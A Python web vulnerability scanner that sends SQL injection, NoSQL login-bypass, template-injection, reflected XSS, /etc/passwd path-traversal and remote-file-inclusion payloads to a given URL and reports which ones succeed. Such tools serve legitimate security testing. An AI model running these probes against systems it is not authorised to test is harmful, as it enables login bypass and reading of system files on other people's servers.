#!/usr/bin/env python3
import requests
import re
import sys
from urllib.parse import urlparse, urlencode

# ANSI colors
R = "\033[91m"   # Red
G = "\033[92m"   # Green
Y = "\033[93m"   # Yellow
B = "\033[94m"   # Blue
E = "\033[0m"    # End color

headers = {"User-Agent": "Mozilla/5.0 (VulnScanner)"}

def banner():
    print(f"""{B}
    ╔══════════════════════════════════════╗
    ║    Professional Web Vuln Scanner     ║
    ╚══════════════════════════════════════╝
    {E}""")

def fetch(url, params=None, method="GET", data=None):
    """Wrapper for safe HTTP requests"""
    try:
        if method == "POST":
            return requests.post(url, headers=headers, json=data, timeout=10)
        return requests.get(url, headers=headers, params=params, timeout=10)
    except requests.exceptions.RequestException:
        return None

def check_sql_injection(url):
    payload = "' OR '1'='1"
    r = fetch(url, params={"id": payload})
    if r and re.search(r"SQL|syntax|mysql|odbc|sqlstate", r.text, re.I):
        return (Y, "POSSIBLE", f"Payload: {payload}\n    Snippet: {r.text[:150]}")
    return (G, "Not Found", "")

def check_ssti(url):
    """Improved SSTI detection with multi-payload confirmation"""
    test_param = "input"
    payloads = {
        "{{7*7}}": "49",
        "{{9*9}}": "81"
    }

    baseline = fetch(url, params={test_param: "test"})
    if not baseline:
        return (G, "Not Found", "")

    baseline_text = baseline.text

    confirmed = []
    possible = []

    for p, expected in payloads.items():
        r = fetch(url, params={test_param: p})
        if not r:
            continue
        body = r.text

        if expected in body and expected not in baseline_text:
            confirmed.append((p, expected))
        elif p in body:
            possible.append(p)

    if confirmed:
        details = "\n    ".join([f"Payload: {p} → Response contained: {e}" for p, e in confirmed])
        return (R, "CONFIRMED", details)
    elif possible:
        details = "\n    ".join([f"Payload echoed back: {p}" for p in possible])
        return (Y, "POSSIBLE", details)
    return (G, "Not Found", "")

def check_xss(url):
    payload = "<script>alert(1)</script>"
    r = fetch(url, params={"q": payload})
    if r and payload in r.text:
        return (Y, "POSSIBLE", f"Payload reflected: {payload}")
    return (G, "Not Found", "")

def check_lfi(url):
    payload = "../../etc/passwd"
    r = fetch(url, params={"file": payload})
    if r and "root:" in r.text:
        return (R, "CONFIRMED", f"Payload: {payload}\n    Response contained passwd entry")
    return (G, "Not Found", "")

def check_rfi(url):
    payload = "http://example.com/malicious.txt"
    r = fetch(url, params={"file": payload})
    if r and "malicious" in r.text.lower():
        return (R, "CONFIRMED", f"Payload: {payload}\n    Response contained external file")
    return (G, "Not Found", "")

def check_nosqli(url):
    payload = {"username": {"$ne": ""}, "password": "foo"}
    r = fetch(url, method="POST", data=payload)
    if r and ("Welcome" in r.text or "dashboard" in r.text):
        return (R, "CONFIRMED", "Bypassed login with NoSQLi payload")
    return (G, "Not Found", "")

def run_scan(target):
    print(f"\n[+] Scanning: {target}\n")
    checks = {
        "SQL Injection": check_sql_injection,
        "NoSQL Injection": check_nosqli,
        "SSTI": check_ssti,
        "XSS": check_xss,
        "LFI": check_lfi,
        "RFI": check_rfi,
    }

    for name, func in checks.items():
        color, status, details = func(target)
        print(f"{color}[{status}]{E} {name}")
        if details:
            print(f"    {details}\n")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <URL>")
        sys.exit(1)
    banner()
    run_scan(sys.argv[1])
